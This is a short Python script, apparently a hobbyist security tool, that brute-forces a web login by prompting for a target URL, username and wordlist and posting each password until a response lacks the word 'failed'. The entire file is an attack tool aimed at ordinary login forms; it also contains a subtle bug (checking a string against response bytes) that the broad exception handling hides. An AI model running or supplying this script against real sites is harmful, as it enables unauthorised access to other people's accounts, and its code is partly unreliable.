#!/usr/bin/env python3
import os
import sys
import requests
import inquirer
from inquirer import errors

sys.path.append(os.path.realpath('.'))

def brute_credentials(data, wordlist, target_url):
    """
    Brute-force a password.
    """
    with open(f"{wordlist}", "r") as wordlist:
        for line in wordlist:
            word = line.strip()
            data["password"] = word
            response = requests.post(target_url, data=data)
            if ("failed" not in response.content):
                print(f"[+] Password found --> {word}")
                exit()
    print("[+] End of line.")

def main():
    try:
        questions = [
            inquirer.Text("target_url", message="Enter the target login URL", validate=lambda _, x: x != ''),
            inquirer.Text("username", message="Enter the target username", validate=lambda _, x: x != ''),
            inquirer.Path("wordlist", message="Enter the absolute path to desired wordlist", validate=lambda _, x: x != '', path_type=inquirer.Path.FILE, exists=True)
            ]
        answers = inquirer.prompt(questions, raise_keyboard_interrupt=True)
        
       
        data_obj = {
            "username": answers["username"],
            "password": "", 
            "Login" : "submit"
            }

        print(f"[+] Beginning brute force attempt on {answers['username']}.")
        brute_credentials(data_obj, answers["wordlist"], answers["target_url"])
    except TypeError:
        pass
    except KeyboardInterrupt:
        print("\n[x] Brute force attempt terminated by user.\n")
    except:
        raise errors.ValidationError('', reason=f"[-] An error has occurred; most likely malformed input.")

if __name__ == "__main__":
    main()

# "/home/goldmund/Downloads/original.txt"

